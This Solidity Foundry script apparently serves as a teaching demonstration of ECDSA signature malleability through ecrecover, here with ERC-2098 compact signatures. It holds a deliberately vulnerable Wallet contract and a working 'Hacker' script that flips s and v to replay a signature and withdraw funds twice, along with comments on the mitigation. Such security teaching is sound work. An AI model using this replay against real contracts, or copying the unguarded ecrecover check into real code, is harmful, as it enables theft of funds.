pragma solidity 0.8.4;

import "forge-std/Script.sol";
import { getSignatureValues, getUint256Length, toEthSignedMessageHash } from "../ecrecover/utils.sol";
import { getCompactSignatureValues } from "./utils.sol";


/**
* @dev This vulnerability is based on the ecrecover vulnerability.
* It exploits the ecrecover vulnerability using compact signature scheme (ERC 2098)
 */

/** 
* ------------------- ecrecover Vulnerability -------------------
* The ecrecover precompile accepts malleable ECDSA signatures.
* The signature is malleable because it can be modified in a specific way and still remain valid.
* Signatures on Ethereum use the secp The signature has 3 parts r, s, v.
* To achieve malleability the s value of any signature can be flipped by subtracting from secp256k1n 
* and flipping v from 27 to 28 or vice-versa, r is left unchanged.
* secp256k1n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 (from the Yellow Paper)
* The r, s & v values can be passsed into the ecrecover precompile and would still evaluate to the same address as the original signature.
*/

/**
* ------------------- Contract Vulnerability -------------------
* The Wallet contract below requires a signature and an amount to be withdrawn.
* Since it uses the ecrecover precompile without the restricitions described in the yellow paper,
* we can modify the signature and still withdraw funds from the wallet.
*/

/**
* ------------------- Mitigation -------------------
* Use Openzeppelin's ECDSA library to verify signatures. It helps to mitigate the issue with ecrecover by
* following the limitations as described in the appendix F of the yellow paper.
* The limitation requires that the value of s be less than secp256k1n/2 + 1 and v be either 27 or 28
*/

contract Hacker is Script{
  bytes signature = hex"12b46d051b4539c888754330d4ced6001de755cf9b400abc5df2b72e2936e67599c8181a7cf3d0fbb2d9fedcdd2e58bd69f2a780f6058df1d897bf5d768f3330";
  uint secp256k1n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
  Wallet wallet;

  function run() external payable{
    wallet = new Wallet{value: 2 ether}();

    compactSignature();
    HackCompactSignature();
  }

  /** 
  * @dev uses the normal signature to claim fund in wallet
  */ 
  function compactSignature() public{
    uint256 oldBalance = address(this).balance;
    (bytes32 r, bytes32 s, uint8 v) = getCompactSignatureValues(signature);
    wallet.withdraw(1 ether, r, s, v);
    console.log("Ecrecover Balance: %s", address(this).balance - oldBalance);
  }

  /** 
  * @dev modifies the available signature and use the modified signature to claim funds
  */ 
  function HackCompactSignature() public {
    (bytes32 r, bytes32 s, uint8 v) = getCompactSignatureValues(signature);

    // flip s to the upper range
    s = bytes32(secp256k1n - uint256(s));
    // flip the value of v
    v = v == 28 ? 27 : 28;
  
    uint256 oldBalance = address(this).balance;
    wallet.withdraw(1 ether, r, s, v);
    console.log("HackEcrecover Balance: %s", address(this).balance - oldBalance);
  }

  receive() external payable {}
}

contract Wallet {
  address owner = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
  error NotOwner();

  constructor ()payable {}
  
  /**
  * @notice if the function below collects the compact signature directly, 
  * the signature can't malleable since the s value can't be flipped.
  * In ERC 2098 the v value takes the most significant bit (MSB) of the s value since it's always 0.
  * When s is flipped to the upper range the MSB of s becomes 1 leaving no space for v.
   */
  function withdraw(uint amount, bytes32 r, bytes32 s, uint8 v) external{
    address recoveredAddress = ecrecover(
      // get the hash input that was signed, 
      // the signature was generated using EIP 191 version 45 (eth_sign)
      toEthSignedMessageHash(amount), 
      v, r, s
    );

    if(recoveredAddress != owner){
      revert NotOwner();
    }
    payable(msg.sender).transfer(amount);
  }

  receive() external payable {}
}
